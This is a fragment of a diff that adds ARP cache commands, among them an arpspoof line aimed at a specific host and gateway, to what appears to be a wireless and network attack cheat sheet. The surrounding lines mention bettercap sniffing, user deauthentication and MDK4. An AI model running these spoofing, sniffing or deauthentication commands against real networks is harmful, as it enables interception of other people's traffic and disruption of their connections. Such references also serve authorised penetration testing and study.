@@ -433,6 +433,12 @@ max
 * set net.sniff.local true
 * net.sniff on
 
+
+------------------------- [Show / delete / spoof ARP cache] --------------------------
+* ip neigh show
+* ip neigh flush all
+* arpspoof -t 10.5.23.42 10.5.23.1
+
 ---------------------------------------------[DISCOVER / DEAUTH USERS]---------------------------------------------
 
 [MDK4 -- ULTIMATE NETWORK LIMITER]
